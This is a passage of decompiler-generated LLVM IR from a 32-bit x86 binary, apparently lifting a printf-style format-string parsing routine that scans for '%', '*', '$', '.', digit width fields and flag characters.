dec_label_pc_8052495:                             ; preds = %dec_label_pc_80524bd.dec_label_pc_8052495_crit_edge, %dec_label_pc_8052493
  %v2_80524a6 = phi i32 [ %v2_80524a6.pre, %dec_label_pc_80524bd.dec_label_pc_8052495_crit_edge ], [ %v15_8052445, %dec_label_pc_8052493 ]
  %v3_80524a6 = phi i32 [ %v1_80524bd, %dec_label_pc_80524bd.dec_label_pc_8052495_crit_edge ], [ 0, %dec_label_pc_8052493 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8052499 = mul i32 %v3_80524a6, 4
  store i32 %v1_8052499, i32* @ecx, align 4
  %v2_80524a0 = load i32, i32* %arg1, align 4
  store i32 %v2_80524a0, i32* @edx, align 4
  %v2_80524a2 = add i32 %v1_8052499, -4
  %v3_80524a2 = add i32 %v2_80524a2, %v2_80524a0
  %v4_80524a2 = inttoptr i32 %v3_80524a2 to i32*
  %v5_80524a2 = load i32, i32* %v4_80524a2, align 4
  store i32 %v5_80524a2, i32* %eax.global-to-local, align 4
  %v1_80524a6 = trunc i32 %v5_80524a2 to i8
  %v4_80524a6 = add i32 %v2_80524a6, 36
  %v5_80524a6 = add i32 %v4_80524a6, %v3_80524a6
  %v6_80524a6 = inttoptr i32 %v5_80524a6 to i8*
  store i8 %v1_80524a6, i8* %v6_80524a6, align 1
  %v0_80524aa = load i32, i32* %eax.global-to-local, align 4
  %v1_80524aa = urem i32 %v0_80524aa, 256
  %v2_80524aa = load i32, i32* @ebx, align 4
  %v3_80524aa = and i32 %v2_80524aa, -256
  %v4_80524aa = or i32 %v3_80524aa, %v1_80524aa
  store i32 %v4_80524aa, i32* @ebx, align 4
  %v1_80524ac = mul i32 %v0_80524aa, 16777216
  %v2_80524ac = sdiv i32 %v1_80524ac, 16777216
  store i32 %v2_80524ac, i32* %eax.global-to-local, align 4
  %v1_80524af = load i32, i32* @edx, align 4
  %v2_80524af = load i32, i32* @ecx, align 4
  %v3_80524af = add i32 %v1_80524af, -4
  %v4_80524af = add i32 %v3_80524af, %v2_80524af
  %v5_80524af = inttoptr i32 %v4_80524af to i32*
  %v6_80524af = load i32, i32* %v5_80524af, align 4
  %v17_80524af = icmp eq i32 %v2_80524ac, %v6_80524af
  %v1_80524b3 = icmp eq i1 %v17_80524af, false
  br i1 %v1_80524b3, label %dec_label_pc_80527fc, label %dec_label_pc_80524b9

dec_label_pc_80524b9:                             ; preds = %dec_label_pc_8052495
  %v3_80524b9 = trunc i32 %v0_80524aa to i8
  %v4_80524b9 = icmp eq i8 %v3_80524b9, 0
  br i1 %v4_80524b9, label %dec_label_pc_80524c3, label %dec_label_pc_80524bd

dec_label_pc_80524bd:                             ; preds = %dec_label_pc_80524b9
  %v0_80524bd = load i32, i32* %esi.global-to-local, align 4
  %v1_80524bd = add i32 %v0_80524bd, 1
  store i32 %v1_80524bd, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_80524bd, 32
  br i1 %tmp175, label %dec_label_pc_80524bd.dec_label_pc_8052495_crit_edge, label %dec_label_pc_80524c3

dec_label_pc_80524bd.dec_label_pc_8052495_crit_edge: ; preds = %dec_label_pc_80524bd
  %v2_80524a6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052495

dec_label_pc_80524c3:                             ; preds = %dec_label_pc_80524bd, %dec_label_pc_80524b9
  %v2_80524c8 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_80524e0.outer

dec_label_pc_80524e0.outer:                       ; preds = %dec_label_pc_80524c3, %dec_label_pc_8052482, %dec_label_pc_80525fd
  %v0_80524ec.ph94 = phi i32 [ %v1_80525fd, %dec_label_pc_80525fd ], [ %v2_8052482, %dec_label_pc_8052482 ], [ %v2_80524c8, %dec_label_pc_80524c3 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_80525fd ], [ %tmp66, %dec_label_pc_8052482 ], [ %tmp66, %dec_label_pc_80524c3 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8052486, %dec_label_pc_80525fd ], [ 0, %dec_label_pc_8052482 ], [ 0, %dec_label_pc_80524c3 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_80525fd ], [ %v3_8052470, %dec_label_pc_8052482 ], [ %v3_8052470, %dec_label_pc_80524c3 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_80525fd ], [ 0, %dec_label_pc_8052482 ], [ 0, %dec_label_pc_80524c3 ]
  %v7_80524e7 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_80524e7 = trunc i64 %v7_80524e7 to i32
  %v2_80524ef = add i32 %v8_80524e7, 80
  br label %dec_label_pc_80524e0

dec_label_pc_80524e0:                             ; preds = %dec_label_pc_80524e0.outer, %dec_label_pc_805259d
  %v0_80524ec = phi i32 [ %v0_80525aa, %dec_label_pc_805259d ], [ %v0_80524ec.ph94, %dec_label_pc_80524e0.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_805259d ], [ %stack_var_-32.1.ph, %dec_label_pc_80524e0.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_805259d ], [ %stack_var_-88.1.ph, %dec_label_pc_80524e0.outer ]
  store i32 %v0_80524ec, i32* @edx, align 4
  store i32 %v0_80524ec, i32* @esi, align 4
  %v1_80524e2 = inttoptr i32 %v0_80524ec to i8*
  %v2_80524e2 = load i8, i8* %v1_80524e2, align 1
  %v11_80524e2 = icmp eq i8 %v2_80524e2, 42
  %v1_80524e5 = icmp eq i1 %v11_80524e2, false
  br i1 %v1_80524e5, label %dec_label_pc_80524f7, label %dec_label_pc_80524e7

dec_label_pc_80524e7:                             ; preds = %dec_label_pc_80524e0
  store i32 %v8_80524e7, i32* %eax.global-to-local, align 4
  %v1_80524ec = add i32 %v0_80524ec, 1
  store i32 %v1_80524ec, i32* @esi, align 4
  %v0_80524ef = load i32, i32* @esp, align 4
  %v3_80524ef = add i32 %v2_80524ef, %v0_80524ef
  %v4_80524ef = inttoptr i32 %v3_80524ef to i32*
  store i32 0, i32* %v4_80524ef, align 4
  %v0_8052511.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80524f7

dec_label_pc_80524f7:                             ; preds = %dec_label_pc_80524e0, %dec_label_pc_80524e7
  %v0_8052511.pre = phi i32 [ %v0_80524ec, %dec_label_pc_80524e0 ], [ %v0_8052511.pre.pre, %dec_label_pc_80524e7 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80524f9 = load i32, i32* @global_var_805f61c, align 4
  store i32 %v0_80524f9, i32* %ebp.global-to-local, align 4
  %v4_8052511.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052511124 = inttoptr i32 %v0_8052511.pre to i8*
  %v2_8052511125 = load i8, i8* %v1_8052511124, align 1
  %v3_8052511126 = zext i8 %v2_8052511125 to i32
  %v5_8052511127 = and i32 %v4_8052511.pre, -256
  %v6_8052511128 = or i32 %v3_8052511126, %v5_8052511127
  store i32 %v6_8052511128, i32* %eax.global-to-local, align 4
  %v2_8052513129 = sext i8 %v2_8052511125 to i32
  store i32 %v2_8052513129, i32* @ecx, align 4
  %v2_8052516130 = mul nsw i32 %v2_8052513129, 2
  %v3_8052516131 = add i32 %v2_8052516130, %v0_80524f9
  %v4_8052516132 = inttoptr i32 %v3_8052516131 to i8*
  %v5_8052516133 = load i8, i8* %v4_8052516132, align 1
  %v6_8052516134 = and i8 %v5_8052516133, 8
  %v7_8052516135 = icmp eq i8 %v6_8052516134, 0
  %v1_805251b136 = icmp eq i1 %v7_8052516135, false
  br i1 %v1_805251b136, label %dec_label_pc_8052501, label %dec_label_pc_805251d

dec_label_pc_8052501:                             ; preds = %dec_label_pc_80524f7, %dec_label_pc_8052510
  %v2_8052513140 = phi i32 [ %v2_8052513, %dec_label_pc_8052510 ], [ %v2_8052513129, %dec_label_pc_80524f7 ]
  %v6_8052511139 = phi i32 [ %v6_8052511, %dec_label_pc_8052510 ], [ %v6_8052511128, %dec_label_pc_80524f7 ]
  %v0_8052510138 = phi i32 [ %v1_8052510, %dec_label_pc_8052510 ], [ %v0_8052511.pre, %dec_label_pc_80524f7 ]
  %v1_8052509137 = phi i32 [ %v0_805252b32, %dec_label_pc_8052510 ], [ 0, %dec_label_pc_80524f7 ]
  %v1_8052501 = add i32 %v1_8052509137, -4094
  %v6_8052501 = sub i32 4093, %v1_8052509137
  %v7_8052501 = and i32 %v6_8052501, %v1_8052509137
  %v8_8052501 = icmp slt i32 %v7_8052501, 0
  %v9_8052501 = icmp eq i32 %v1_8052501, 0
  %v10_8052501 = icmp slt i32 %v1_8052501, 0
  %v3_8052507 = icmp eq i1 %v10_8052501, %v8_8052501
  %v4_8052507 = icmp eq i1 %v9_8052501, false
  %v5_8052507 = and i1 %v4_8052507, %v3_8052507
  br i1 %v5_8052507, label %dec_label_pc_8052510, label %dec_label_pc_8052509

dec_label_pc_8052509:                             ; preds = %dec_label_pc_8052501
  %v3_8052509 = mul i32 %v1_8052509137, 10
  store i32 %v3_8052509, i32* %eax.global-to-local, align 4
  %v2_805250c = add i32 %v3_8052509, -48
  %v3_805250c = add i32 %v2_805250c, %v2_8052513140
  store i32 %v3_805250c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052510

dec_label_pc_8052510:                             ; preds = %dec_label_pc_8052501, %dec_label_pc_8052509
  %v0_805252b32 = phi i32 [ %v1_8052509137, %dec_label_pc_8052501 ], [ %v3_805250c, %dec_label_pc_8052509 ]
  %v4_805251128 = phi i32 [ %v6_8052511139, %dec_label_pc_8052501 ], [ %v3_8052509, %dec_label_pc_8052509 ]
  %v1_8052510 = add i32 %v0_8052510138, 1
  store i32 %v1_8052510, i32* @esi, align 4
  %v1_8052511 = inttoptr i32 %v1_8052510 to i8*
  %v2_8052511 = load i8, i8* %v1_8052511, align 1
  %v3_8052511 = zext i8 %v2_8052511 to i32
  %v5_8052511 = and i32 %v4_805251128, -256
  %v6_8052511 = or i32 %v3_8052511, %v5_8052511
  store i32 %v6_8052511, i32* %eax.global-to-local, align 4
  %v2_8052513 = sext i8 %v2_8052511 to i32
  store i32 %v2_8052513, i32* @ecx, align 4
  %v2_8052516 = mul nsw i32 %v2_8052513, 2
  %v3_8052516 = add i32 %v2_8052516, %v0_80524f9
  %v4_8052516 = inttoptr i32 %v3_8052516 to i8*
  %v5_8052516 = load i8, i8* %v4_8052516, align 1
  %v6_8052516 = and i8 %v5_8052516, 8
  %v7_8052516 = icmp eq i8 %v6_8052516, 0
  %v1_805251b = icmp eq i1 %v7_8052516, false
  br i1 %v1_805251b, label %dec_label_pc_8052501, label %dec_label_pc_805251d

dec_label_pc_805251d:                             ; preds = %dec_label_pc_8052510, %dec_label_pc_80524f7
  %v1_8052509.lcssa = phi i32 [ 0, %dec_label_pc_80524f7 ], [ %v0_805252b32, %dec_label_pc_8052510 ]
  %v0_8052510.lcssa = phi i32 [ %v0_8052511.pre, %dec_label_pc_80524f7 ], [ %v1_8052510, %dec_label_pc_8052510 ]
  %v2_8052511.lcssa = phi i8 [ %v2_8052511125, %dec_label_pc_80524f7 ], [ %v2_8052511, %dec_label_pc_8052510 ]
  %v6_8052511.lcssa = phi i32 [ %v6_8052511128, %dec_label_pc_80524f7 ], [ %v6_8052511, %dec_label_pc_8052510 ]
  %v0_805251d = load i32, i32* @edx, align 4
  %v1_805251d = add i32 %v0_805251d, -1
  %v2_805251d = inttoptr i32 %v1_805251d to i8*
  %v3_805251d = load i8, i8* %v2_805251d, align 1
  %v12_805251d = icmp eq i8 %v3_805251d, 37
  %v1_8052521 = icmp eq i1 %v12_805251d, false
  br i1 %v1_8052521, label %dec_label_pc_80525b4, label %dec_label_pc_8052527

dec_label_pc_8052527:                             ; preds = %dec_label_pc_805251d
  %v10_8052527 = icmp eq i8 %v2_8052511.lcssa, 36
  %v1_8052529 = icmp eq i1 %v10_8052527, false
  br i1 %v1_8052529, label %dec_label_pc_805255b, label %dec_label_pc_805252b

dec_label_pc_805252b:                             ; preds = %dec_label_pc_8052527
  %tmp89 = icmp slt i32 %v1_8052509.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_805255b, label %dec_label_pc_805252f

dec_label_pc_805252f:                             ; preds = %dec_label_pc_805252b
  %v1_805252f = add i32 %v0_8052510.lcssa, 1
  store i32 %v1_805252f, i32* @edx, align 4
  %v4_8052532 = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_8052532, label %dec_label_pc_80527fc, label %dec_label_pc_805253d

dec_label_pc_805253d:                             ; preds = %dec_label_pc_805252f
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_8052545 = sub i32 %v1_8052509.lcssa, %stack_var_-88.1
  %v8_8052545 = xor i32 %v1_8052509.lcssa, %stack_var_-88.1
  %v9_8052545 = xor i32 %v2_8052545, %v1_8052509.lcssa
  %v10_8052545 = and i32 %v9_8052545, %v8_8052545
  %v11_8052545 = icmp slt i32 %v10_8052545, 0
  %v12_8052545 = icmp eq i32 %v2_8052545, 0
  %v13_8052545 = icmp slt i32 %v2_8052545, 0
  %v3_8052547 = icmp ne i1 %v13_8052545, %v11_8052545
  %v4_8052547 = or i1 %v12_8052545, %v3_8052547
  %stack_var_-88.1.v0_8052549 = select i1 %v4_8052547, i32 %stack_var_-88.1, i32 %v1_8052509.lcssa
  br label %dec_label_pc_8052557

dec_label_pc_8052557:                             ; preds = %dec_label_pc_805256b, %dec_label_pc_805253d, %dec_label_pc_805256f
  %v0_8052557 = phi i32 [ %v1_805252f, %dec_label_pc_805253d ], [ %v0_805251d, %dec_label_pc_805256f ], [ %v0_805251d, %dec_label_pc_805256b ]
  %stack_var_-32.2 = phi i32 [ %v1_8052509.lcssa, %dec_label_pc_805253d ], [ %stack_var_-32.1, %dec_label_pc_805256f ], [ %stack_var_-32.1, %dec_label_pc_805256b ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_8052549, %dec_label_pc_805253d ], [ 0, %dec_label_pc_805256f ], [ 0, %dec_label_pc_805256b ]
  store i32 %v0_8052557, i32* @esi, align 4
  br label %dec_label_pc_805257e

dec_label_pc_805255b:                             ; preds = %dec_label_pc_805252b, %dec_label_pc_8052527
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805256b, label %dec_label_pc_8052562

dec_label_pc_8052562:                             ; preds = %dec_label_pc_805255b
  %v10_8052562 = icmp eq i8 %v2_8052511.lcssa, 109
  br i1 %v10_8052562, label %dec_label_pc_80525b4, label %dec_label_pc_80527fc

dec_label_pc_805256b:                             ; preds = %dec_label_pc_805255b
  %tmp176 = icmp ugt i32 %v0_8052510.lcssa, %v0_805251d
  br i1 %tmp176, label %dec_label_pc_805256f, label %dec_label_pc_8052557

dec_label_pc_805256f:                             ; preds = %dec_label_pc_805256b
  %v1_805256f = inttoptr i32 %v0_805251d to i8*
  %v2_805256f = load i8, i8* %v1_805256f, align 1
  %v8_805256f = icmp eq i8 %v2_805256f, 48
  br i1 %v8_805256f, label %dec_label_pc_8052557, label %dec_label_pc_80525b4

dec_label_pc_805257e:                             ; preds = %dec_label_pc_805258f, %dec_label_pc_8052557
  %v0_80525aa = phi i32 [ %v1_805258f, %dec_label_pc_805258f ], [ %v0_8052557, %dec_label_pc_8052557 ]
  %v4_805258835 = phi i32 [ %v6_8052588, %dec_label_pc_805258f ], [ %v6_8052511.lcssa, %dec_label_pc_8052557 ]
  store i32 ptrtoint ([8 x i8]* @global_var_805d06a.930 to i32), i32* %edx.global-to-local, align 4
  %v1_805258b = inttoptr i32 %v0_80525aa to i8*
  br label %dec_label_pc_8052588

dec_label_pc_8052588:                             ; preds = %dec_label_pc_8052599, %dec_label_pc_805257e
  %v4_8052588 = phi i32 [ %v4_805258835, %dec_label_pc_805257e ], [ %v6_8052588, %dec_label_pc_8052599 ]
  %v0_805258a = phi i32 [ ptrtoint ([8 x i8]* @global_var_805d06a.930 to i32), %dec_label_pc_805257e ], [ %v1_805258a, %dec_label_pc_8052599 ]
  %v0_8052599 = phi i32 [ 1, %dec_label_pc_805257e ], [ %v2_8052599, %dec_label_pc_8052599 ]
  store i32 %v0_8052599, i32* @ecx, align 4
  %v1_8052588 = inttoptr i32 %v0_805258a to i8*
  %v2_8052588 = load i8, i8* %v1_8052588, align 1
  %v3_8052588 = zext i8 %v2_8052588 to i32
  %v5_8052588 = and i32 %v4_8052588, -256
  %v6_8052588 = or i32 %v3_8052588, %v5_8052588
  store i32 %v6_8052588, i32* %eax.global-to-local, align 4
  %v1_805258a = add i32 %v0_805258a, 1
  store i32 %v1_805258a, i32* @edx, align 4
  %v2_805258b = load i8, i8* %v1_805258b, align 1
  %v15_805258b = icmp eq i8 %v2_805258b, %v2_8052588
  %v1_805258d = icmp eq i1 %v15_805258b, false
  br i1 %v1_805258d, label %dec_label_pc_8052594, label %dec_label_pc_805258f

dec_label_pc_805258f:                             ; preds = %dec_label_pc_8052588
  %v1_805258f = add i32 %v0_80525aa, 1
  store i32 %v1_805258f, i32* @esi, align 4
  %v0_8052590 = load i32, i32* %edi.global-to-local, align 4
  %v2_8052590 = or i32 %v0_8052590, %v0_8052599
  store i32 %v2_8052590, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805257e

dec_label_pc_8052594:                             ; preds = %dec_label_pc_8052588
  %v1_8052594 = inttoptr i32 %v1_805258a to i8*
  %v2_8052594 = load i8, i8* %v1_8052594, align 1
  %v3_8052594 = icmp eq i8 %v2_8052594, 0
  br i1 %v3_8052594, label %dec_label_pc_805259d, label %dec_label_pc_8052599

dec_label_pc_8052599:                             ; preds = %dec_label_pc_8052594
  %v2_8052599 = mul i32 %v0_8052599, 2
  br label %dec_label_pc_8052588

dec_label_pc_805259d:                             ; preds = %dec_label_pc_8052594
  %v0_805259d = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80525a1 = udiv i32 %v0_805259d, 2
  %v1_80525a1.not = or i32 %v1_80525a1, -6
  %v1_80525a6 = xor i32 %v1_80525a1.not, 5
  store i32 %v1_80525a6, i32* %eax.global-to-local, align 4
  %v2_80525a8 = and i32 %v1_80525a6, %v0_805259d
  store i32 %v2_80525a8, i32* %edi.global-to-local, align 4
  %v1_80525aa = add i32 %v0_80525aa, -1
  %v2_80525aa = inttoptr i32 %v1_80525aa to i8*
  %v3_80525aa = load i8, i8* %v2_80525aa, align 1
  %v12_80525aa = icmp eq i8 %v3_80525aa, 37
  %v1_80525ae = icmp eq i1 %v12_80525aa, false
  br i1 %v1_80525ae, label %dec_label_pc_80524e0, label %dec_label_pc_80525b4

dec_label_pc_80525b4:                             ; preds = %dec_label_pc_805256f, %dec_label_pc_805259d, %dec_label_pc_805251d, %dec_label_pc_8052562
  %v0_80525d7 = phi i32 [ %v1_8052509.lcssa, %dec_label_pc_8052562 ], [ %v1_8052509.lcssa, %dec_label_pc_805256f ], [ 0, %dec_label_pc_805259d ], [ %v1_8052509.lcssa, %dec_label_pc_805251d ]
  %v1_80525e0 = phi i32 [ %v0_8052510.lcssa, %dec_label_pc_8052562 ], [ %v0_8052510.lcssa, %dec_label_pc_805256f ], [ %v0_80525aa, %dec_label_pc_805259d ], [ %v0_8052510.lcssa, %dec_label_pc_805251d ]
  %v0_80525dd = phi i32 [ %v0_805251d, %dec_label_pc_8052562 ], [ %v0_805251d, %dec_label_pc_805256f ], [ %v1_805258a, %dec_label_pc_805259d ], [ %v0_805251d, %dec_label_pc_805251d ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_8052562 ], [ %stack_var_-32.1, %dec_label_pc_805256f ], [ %stack_var_-32.2, %dec_label_pc_805259d ], [ %stack_var_-32.1, %dec_label_pc_805251d ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_8052562 ], [ 0, %dec_label_pc_805256f ], [ %stack_var_-88.2, %dec_label_pc_805259d ], [ %stack_var_-88.1, %dec_label_pc_805251d ]
  %v1_80525b4 = inttoptr i32 %v0_80525dd to i8*
  %v2_80525b4 = load i8, i8* %v1_80525b4, align 1
  %v11_80525b4 = icmp eq i8 %v2_80525b4, 42
  %v1_80525b7 = icmp eq i1 %v11_80525b4, false
  br i1 %v1_80525b7, label %dec_label_pc_80525ed, label %dec_label_pc_80525b9

dec_label_pc_80525b9:                             ; preds = %dec_label_pc_80525b4
  %v4_80525b9 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_80525b9, label %dec_label_pc_80525dd, label %dec_label_pc_80525c0

dec_label_pc_80525c0:                             ; preds = %dec_label_pc_80525b9
  %v1_80525c0 = inttoptr i32 %v1_80525e0 to i8*
  %v2_80525c0 = load i8, i8* %v1_80525c0, align 1
  %v11_80525c0 = icmp eq i8 %v2_80525c0, 36
  %v1_80525c3 = icmp eq i1 %v11_80525c0, false
  br i1 %v1_80525c3, label %dec_label_pc_80527fc, label %dec_label_pc_80525c9

dec_label_pc_80525c9:                             ; preds = %dec_label_pc_80525c0
  %tmp91 = icmp slt i32 %v0_80525d7, 1
  br i1 %tmp91, label %dec_label_pc_80527fc, label %dec_label_pc_80525d1

dec_label_pc_80525d1:                             ; preds = %dec_label_pc_80525c9
  store i32 %v8_80524e7, i32* %eax.global-to-local, align 4
  %v1_80525d6 = add i32 %v1_80525e0, 1
  store i32 %v1_80525d6, i32* @esi, align 4
  %v1_80525d7 = load i32, i32* @esp, align 4
  %v3_80525d7 = add i32 %v8_80524e7, 68
  %v4_80525d7 = add i32 %v3_80525d7, %v1_80525d7
  %v5_80525d7 = inttoptr i32 %v4_80525d7 to i32*
  store i32 %v0_80525d7, i32* %v5_80525d7, align 4
  %v0_805261b.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80525e8

dec_label_pc_80525dd:                             ; preds = %dec_label_pc_80525b9
  %v1_80525dd = add i32 %v0_80525dd, 1
  store i32 %v1_80525dd, i32* %eax.global-to-local, align 4
  %v12_80525e0 = icmp eq i32 %v1_80525dd, %v1_80525e0
  %v1_80525e2 = icmp eq i1 %v12_80525e0, false
  br i1 %v1_80525e2, label %dec_label_pc_80527fc, label %dec_label_pc_80525e8

dec_label_pc_80525e8:                             ; preds = %dec_label_pc_80525dd, %dec_label_pc_80525d1
  %v0_805261b.pre.pre.pre = phi i32 [ %v1_80525e0, %dec_label_pc_80525dd ], [ %v0_805261b.pre.pre.pre.pre, %dec_label_pc_80525d1 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80525ed

dec_label_pc_80525ed:                             ; preds = %dec_label_pc_80525b4, %dec_label_pc_80525e8
  %v0_805261b.pre.pre = phi i32 [ %v1_80525e0, %dec_label_pc_80525b4 ], [ %v0_805261b.pre.pre.pre, %dec_label_pc_80525e8 ]
  %v0_8052486 = phi i32 [ %v0_80525d7, %dec_label_pc_80525b4 ], [ -2147483648, %dec_label_pc_80525e8 ]
  %v4_80525ed = trunc i64 %stack_var_-92.1.ph to i32
  %v5_80525ed = icmp eq i32 %v4_80525ed, 0
  %v1_80525f2 = icmp eq i1 %v5_80525ed, false
  %.pre = inttoptr i32 %v0_805261b.pre.pre to i8*
  br i1 %v1_80525f2, label %dec_label_pc_8052616, label %dec_label_pc_80525f8

dec_label_pc_80525f8:                             ; preds = %dec_label_pc_80525ed
  %v2_80525f8 = load i8, i8* %.pre, align 1
  %v11_80525f8 = icmp eq i8 %v2_80525f8, 46
  %v1_80525fb = icmp eq i1 %v11_80525f8, false
  br i1 %v1_80525fb, label %dec_label_pc_805260f, label %dec_label_pc_80525fd

dec_label_pc_80525fd:                             ; preds = %dec_label_pc_80525f8
  %v1_80525fd = add i32 %v0_805261b.pre.pre, 1
  store i32 %v1_80525fd, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80524e0.outer

dec_label_pc_805260f:                             ; preds = %dec_label_pc_80525f8
  br label %dec_label_pc_8052616

dec_label_pc_8052616:                             ; preds = %dec_label_pc_80525ed, %dec_label_pc_805260f
  %stack_var_-96.2 = phi i32 [ %v0_8052486, %dec_label_pc_805260f ], [ %stack_var_-96.1.ph, %dec_label_pc_80525ed ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805260f ], [ %v0_8052486, %dec_label_pc_80525ed ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805d018.931 to i32), i32* @edx, align 4
  %v4_805261b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805261b

dec_label_pc_805261b:                             ; preds = %dec_label_pc_8052625, %dec_label_pc_8052616
  %v0_8052625 = phi i32 [ %v1_8052625, %dec_label_pc_8052625 ], [ ptrtoint ([9 x i8]* @global_var_805d018.931 to i32), %dec_label_pc_8052616 ]
  %v4_805261b = phi i32 [ %v6_805261b, %dec_label_pc_8052625 ], [ %v4_805261b.pre, %dec_label_pc_8052616 ]
  %v2_805261b = load i8, i8* %.pre, align 1
  %v3_805261b = zext i8 %v2_805261b to i32
  %v5_805261b = and i32 %v4_805261b, -256
  %v6_805261b = or i32 %v3_805261b, %v5_805261b
  store i32 %v6_805261b, i32* %eax.global-to-local, align 4
  %v3_805261d = inttoptr i32 %v0_8052625 to i8*
  %v4_805261d = load i8, i8* %v3_805261d, align 1
  %v15_805261d = icmp eq i8 %v2_805261b, %v4_805261d
  br i1 %v15_805261d, label %dec_label_pc_805248d, label %dec_label_pc_8052625

dec_label_pc_8052625:                             ; preds = %dec_label_pc_805261b
  %v1_8052625 = add i32 %v0_8052625, 1
  store i32 %v1_8052625, i32* @edx, align 4
  %v1_8052626 = inttoptr i32 %v1_8052625 to i8*
  %v2_8052626 = load i8, i8* %v1_8052626, align 1
  %v3_8052626 = icmp eq i8 %v2_8052626, 0
  %v1_8052629 = icmp eq i1 %v3_8052626, false
  br i1 %v1_8052629, label %dec_label_pc_805261b, label %dec_label_pc_805262b

dec_label_pc_805262b:                             ; preds = %dec_label_pc_8052625, %dec_label_pc_805248d
  %v0_805263e = phi i32 [ %v1_805248d, %dec_label_pc_805248d ], [ %v0_805261b.pre.pre, %dec_label_pc_8052625 ]
  %v0_805263b = phi i32 [ %v0_8052625, %dec_label_pc_805248d ], [ %v1_8052625, %dec_label_pc_8052625 ]
  %v1_805262d = add i32 %v0_805263b, -134598680
  %v1_8052632 = add i32 %v0_805263b, -134598681
  %v5_8052632 = sub i32 134598680, %v0_805263b
  %v6_8052632 = and i32 %v1_805262d, %v5_8052632
  %v7_8052632 = icmp slt i32 %v6_8052632, 0
  %v8_8052632 = icmp eq i32 %v1_8052632, 0
  %v9_8052632 = icmp slt i32 %v1_8052632, 0
  store i32 %v1_8052632, i32* %eax.global-to-local, align 4
  %v3_8052633 = icmp eq i1 %v9_8052632, %v7_8052632
  %v4_8052633 = icmp eq i1 %v8_8052632, false
  %v5_8052633 = and i1 %v4_8052633, %v3_8052633
  br i1 %v5_8052633, label %dec_label_pc_805263f, label %dec_label_pc_8052635

dec_label_pc_8052635:                             ; preds = %dec_label_pc_805262b
  %v1_8052635 = inttoptr i32 %v0_805263e to i8*
  %v2_8052635 = load i8, i8* %v1_8052635, align 1
  %v3_8052635 = zext i8 %v2_8052635 to i32
  %v5_8052635 = and i32 %v1_8052632, -256
  %v6_8052635 = or i32 %v3_8052635, %v5_8052635
  store i32 %v6_8052635, i32* %eax.global-to-local, align 4
  %v3_8052637 = inttoptr i32 %v0_805263b to i8*
  %v4_8052637 = load i8, i8* %v3_8052637, align 1
  %v15_8052637 = icmp eq i8 %v2_8052635, %v4_8052637
  %v1_8052639 = icmp eq i1 %v15_8052637, false
  br i1 %v1_8052639, label %dec_label_pc_805263f, label %dec_label_pc_805263b

dec_label_pc_805263b:                             ; preds = %dec_label_pc_8052635
  %v1_805263b = add i32 %v0_805263b, 9
  store i32 %v1_805263b, i32* @edx, align 4
  %v1_805263e = add i32 %v0_805263e, 1
  store i32 %v1_805263e, i32* @esi, align 4
  br label %dec_label_pc_805263f

dec_label_pc_805263f:                             ; preds = %dec_label_pc_8052635, %dec_label_pc_805262b, %dec_label_pc_805263b
  %v4_8052646 = phi i32 [ %v6_8052635, %dec_label_pc_8052635 ], [ %v1_8052632, %dec_label_pc_805262b ], [ %v6_8052635, %dec_label_pc_805263b ]
  %v0_8052646 = phi i32 [ %v0_805263e, %dec_label_pc_8052635 ], [ %v0_805263e, %dec_label_pc_805262b ], [ %v1_805263e, %dec_label_pc_805263b ]
  %v0_805263f = phi i32 [ %v0_805263b, %dec_label_pc_8052635 ], [ %v0_805263b, %dec_label_pc_805262b ], [ %v1_805263b, %dec_label_pc_805263b ]
  %v1_805263f = add i32 %v0_805263f, 9
  %v2_805263f = inttoptr i32 %v1_805263f to i8*
  %v3_805263f = load i8, i8* %v2_805263f, align 1
  %v4_805263f = sext i8 %v3_805263f to i32
  %v2_8052643 = mul nsw i32 %v4_805263f, 256
  store i32 %v2_8052643, i32* %ebx.global-to-local, align 4
  %v1_8052646 = inttoptr i32 %v0_8052646 to i8*
  %v2_8052646 = load i8, i8* %v1_8052646, align 1
  %v3_8052646 = zext i8 %v2_8052646 to i32
  %v5_8052646 = and i32 %v4_8052646, -256
  %v6_8052646 = or i32 %v3_8052646, %v5_8052646
  store i32 %v6_8052646, i32* %eax.global-to-local, align 4
  %v4_8052648 = icmp eq i8 %v2_8052646, 0
  br i1 %v4_8052648, label %dec_label_pc_80527fc, label %dec_label_pc_8052650

dec_label_pc_8052650:                             ; preds = %dec_label_pc_805263f
  store i32 ptrtoint ([21 x i8]* @global_var_805d055.932 to i32), i32* %ecx.global-to-local, align 4
